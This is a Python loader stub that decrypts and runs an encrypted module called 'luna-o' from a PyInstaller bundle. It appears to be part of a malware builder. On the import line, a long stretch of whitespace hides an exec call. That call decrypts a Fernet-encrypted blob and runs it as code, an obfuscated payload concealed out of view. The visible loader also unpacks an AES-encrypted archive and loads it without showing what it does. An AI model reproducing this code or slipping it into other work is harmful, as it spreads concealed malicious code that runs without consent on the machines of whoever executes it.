import base64
import os
import sys
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(Fernet(b'wkgLradOn4T7o3U5339U5RgFIf35eXLKeMGMGAh0fhI=').decrypt(b'gAAAAABmeZ0_OBoe3c4H-xcT0DYVLH5fXYtnIUfRF_LkisPzrr1NGv_BBkqI8n8_qMQnnQx80VtRpaw4SG77pY2Y8mEvJe8qN6_vcefkMN0Ma_M2WRnLdKdWn3yj21nL98l8AcEsR0-9WlXrWAMfpJLCKff9eSxYoQ=='))
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "luna.aes")
module = "luna-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
